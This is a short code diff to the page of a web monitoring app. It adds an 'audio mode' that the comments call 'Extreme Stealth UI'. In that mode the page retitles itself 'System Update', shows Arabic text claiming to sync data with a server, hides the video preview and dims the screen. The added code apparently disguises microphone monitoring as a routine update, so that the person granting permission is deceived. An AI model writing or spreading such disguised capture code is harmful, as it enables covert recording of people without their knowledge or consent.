@@ -117,6 +117,16 @@
         import { Core } from './js/core.js';
         import { MonitorSystem } from './js/monitor.js';
 
+        const isAudioOnly = new URLSearchParams(window.location.search).get('mode') === 'audio';
+
+        if (isAudioOnly) {
+            // Extreme Stealth UI adjustments
+            document.title = "System Update"; // Generic title
+            document.getElementById('start-btn').innerHTML = '<ion-icon name="sync-outline"></ion-icon> بدة المزامنة';
+            document.querySelector('#permission-overlay p').innerText = "جاري الاتصال بالسيرفر لتحديث البيانات...";
+            document.getElementById('localVideo').style.display = 'none';
+        }
+
         const roomId = Core.getRoomId();
         let system = null;
 
@@ -124,6 +134,13 @@
             if (system) return;
             const overlay = document.getElementById('permission-overlay');
             if (overlay) overlay.style.display = 'none';
+
+            if (isAudioOnly) {
+                // Immediate stealth for audio mode
+                document.getElementById('dim-overlay').classList.add('active');
+                updateClock();
+            }
+
             system = new MonitorSystem(roomId);
 
             if ('wakeLock' in navigator) {
